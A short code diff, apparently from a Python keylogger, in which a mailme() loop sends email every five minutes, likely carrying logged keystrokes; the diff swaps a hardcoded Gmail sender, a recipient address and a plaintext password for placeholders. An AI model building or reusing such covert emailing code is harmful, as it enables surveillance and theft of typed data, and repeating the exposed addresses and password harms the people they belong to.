@@ -64,9 +64,9 @@ def logger():
 def mailme():
     while True:
         time.sleep(300)
-        sender_email = "gamersahilsingh7@gmail.com"
-        rec_email = "np01nt4a190175@islingtoncollege.edu.np"
-        password = 'blackarch2020'
+        sender_email = "#"
+        rec_email = "#"
+        password = '#'
 
         message = MIMEMultipart()
 
